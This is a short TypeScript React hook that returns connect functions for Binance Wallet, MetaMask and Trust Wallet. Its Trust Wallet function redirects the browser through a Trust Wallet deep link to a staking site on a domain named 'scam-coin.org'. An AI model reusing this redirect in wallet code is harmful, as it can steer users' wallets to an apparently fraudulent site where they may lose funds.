import {useWeb3} from "./useWeb3";
import {bscConnector, injectedConnector} from "../lib/web3";

type Wallet3Connectors = {
	[key: string]: () => Promise<void>;
}

export const useConnectWallet = (): Wallet3Connectors => {
	const {activate} = useWeb3();
	return {
		connectBinanceWallet: () => activate(bscConnector),
		connectMetamask: () => activate(injectedConnector),
		connectTrustWallet: () => {
			window.location.href = "https://link.trustwallet.com/open_url?url=https://staking.scam-coin.org&coin=714";
			return Promise.resolve();
		},
	}
};
